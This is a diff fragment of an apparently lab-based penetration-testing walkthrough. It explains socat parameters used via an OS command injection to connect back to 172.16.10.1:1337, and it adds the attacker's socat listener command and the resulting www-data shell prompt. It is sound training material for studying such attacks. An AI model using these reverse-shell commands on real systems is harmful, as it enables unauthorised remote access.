@@ -81,4 +81,13 @@ Next, by using the previously identified OS Command Injection vulnerability on *
 - Pass `exec:` a third parameter of `stderr` to capture the standard error stream.
 - Finally, `tcp:172.16.10.1:1337` sets the connection address using the `TCP:<host>:<port>` Address Type.
 
+<br>
 
+The terminal window running the listener should display output similar to that below:
+```
+┌──(kali㉿kali)-[~]
+└─$ socat file:$(tty),raw,echo=0 tcp-listen:1337
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@p-web-02:/var/www/html$ 
+```
